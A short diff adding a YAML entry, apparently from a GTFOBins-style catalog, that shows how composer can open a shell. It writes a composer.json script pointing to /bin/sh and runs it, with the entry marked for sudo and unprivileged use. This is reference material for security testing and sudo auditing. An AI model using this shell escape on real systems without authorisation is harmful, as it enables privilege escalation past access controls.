@@ -1,0 +1,10 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
+      composer run-script x
+    contexts:
+      sudo:
+      unprivileged:
+...
